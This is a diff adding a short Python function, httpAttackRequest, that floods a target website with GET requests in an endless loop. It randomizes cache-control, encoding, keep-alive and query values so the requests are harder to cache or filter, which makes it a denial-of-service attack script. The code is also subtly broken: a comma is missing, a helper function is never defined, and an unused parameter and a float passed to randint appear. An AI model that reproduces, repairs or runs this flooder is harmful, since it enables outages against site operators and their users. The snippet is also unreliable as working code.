@@ -1,0 +1,27 @@
+import requests, random
+
+def httpAttackRequest(website, userAgent, referer):
+    # Random no-cache entries 
+    noCacheDirectives = ['no-cache', 'max-age=0']
+    random.shuffle(noCacheDirectives)
+    nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
+    noCache = ', '.join(noCacheDirectives[:nrNoCache])  
+    # Random accept encoding
+    acceptEncoding = ['\'\'','*','identity','gzip','deflate']
+    random.shuffle(acceptEncoding)
+    nrEncodings = random.randint(1,len(acceptEncoding)/2)
+    roundEncodings = acceptEncoding[:nrEncodings] 
+    
+    headers = {
+    'User-Agent': getUserAgents(), \
+    'Cache-Control': noCache, \
+    'Accept-Encoding': ', '.join(roundEncodings), \
+    'Connection': 'keep-alive', \
+    'Referer': referer, \
+    'Keep-Alive': random.randint(1,1000), \
+    'Host': website
+    }
+
+    while True:
+    	requests.get(website, params={random.randint(1000, 9999): random.randint(1000, 9999)} headers=headers)
+
